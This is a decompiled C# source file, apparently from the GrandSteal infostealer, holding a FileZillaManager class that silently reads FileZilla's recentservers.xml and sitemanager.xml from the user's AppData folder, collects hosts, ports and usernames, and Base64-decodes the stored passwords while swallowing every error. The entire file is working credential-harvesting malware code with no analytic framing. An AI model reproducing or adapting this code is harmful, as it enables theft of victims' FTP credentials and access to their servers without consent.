using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using GrandSteal.Client.Models.Credentials;
using GrandSteal.SharedModels.Models;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x0200001F RID: 31
	public class FileZillaManager : ICredentialsManager<FtpCredential>
	{
		// Token: 0x060000DC RID: 220 RVA: 0x00006A78 File Offset: 0x00004C78
		public IEnumerable<FtpCredential> GetAll()
		{
			List<FtpCredential> list = new List<FtpCredential>();
			try
			{
				string path = string.Format("{0}\\FileZilla\\recentservers.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
				string path2 = string.Format("{0}\\FileZilla\\sitemanager.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
				if (File.Exists(path))
				{
					list.AddRange(FileZillaManager.ExtractFtpCredentials(path));
				}
				if (File.Exists(path2))
				{
					list.AddRange(FileZillaManager.ExtractFtpCredentials(path2));
				}
				return list;
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000DD RID: 221 RVA: 0x00006AF4 File Offset: 0x00004CF4
		public static IEnumerable<FtpCredential> ExtractFtpCredentials(string Path)
		{
			List<FtpCredential> list = new List<FtpCredential>();
			try
			{
				XmlTextReader reader = new XmlTextReader(Path);
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(reader);
				foreach (object obj in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
				{
					FtpCredential ftpCredential = FileZillaManager.ExtractRecentCredential((XmlNode)obj);
					if (ftpCredential.Username != "UNKNOWN" && ftpCredential.Server != "UNKNOWN")
					{
						list.Add(ftpCredential);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000DE RID: 222 RVA: 0x00006BB4 File Offset: 0x00004DB4
		public static FtpCredential ExtractRecentCredential(XmlNode xmlNode)
		{
			FtpCredential ftpCredential = new FtpCredential();
			try
			{
				foreach (object obj in xmlNode.ChildNodes)
				{
					XmlNode xmlNode2 = (XmlNode)obj;
					if (xmlNode2.Name == "Host")
					{
						ftpCredential.Server = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Port")
					{
						ftpCredential.Server = ftpCredential.Server + ":" + xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "User")
					{
						ftpCredential.Username = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Pass")
					{
						ftpCredential.Password = FileZillaManager.Base64Decode(xmlNode2.InnerText);
					}
				}
			}
			catch
			{
			}
			finally
			{
				ftpCredential.Username = (string.IsNullOrEmpty(ftpCredential.Username) ? "UNKNOWN" : ftpCredential.Username);
				ftpCredential.Server = (string.IsNullOrEmpty(ftpCredential.Server) ? "UNKNOWN" : ftpCredential.Server);
				ftpCredential.Password = (string.IsNullOrEmpty(ftpCredential.Password) ? "UNKNOWN" : ftpCredential.Password);
			}
			return ftpCredential;
		}

		// Token: 0x060000DF RID: 223 RVA: 0x00006BB4 File Offset: 0x00004DB4
		public static FtpCredential ExtractManagerCredential(XmlNode xmlNode)
		{
			FtpCredential ftpCredential = new FtpCredential();
			try
			{
				foreach (object obj in xmlNode.ChildNodes)
				{
					XmlNode xmlNode2 = (XmlNode)obj;
					if (xmlNode2.Name == "Host")
					{
						ftpCredential.Server = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Port")
					{
						ftpCredential.Server = ftpCredential.Server + ":" + xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "User")
					{
						ftpCredential.Username = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Pass")
					{
						ftpCredential.Password = FileZillaManager.Base64Decode(xmlNode2.InnerText);
					}
				}
			}
			catch
			{
			}
			finally
			{
				ftpCredential.Username = (string.IsNullOrEmpty(ftpCredential.Username) ? "UNKNOWN" : ftpCredential.Username);
				ftpCredential.Server = (string.IsNullOrEmpty(ftpCredential.Server) ? "UNKNOWN" : ftpCredential.Server);
				ftpCredential.Password = (string.IsNullOrEmpty(ftpCredential.Password) ? "UNKNOWN" : ftpCredential.Password);
			}
			return ftpCredential;
		}

		// Token: 0x060000E0 RID: 224 RVA: 0x00006D20 File Offset: 0x00004F20
		public static string Base64Decode(string input)
		{
			string result;
			try
			{
				byte[] bytes = Convert.FromBase64String(input);
				result = Encoding.UTF8.GetString(bytes);
			}
			catch
			{
				result = input;
			}
			return result;
		}
	}
}
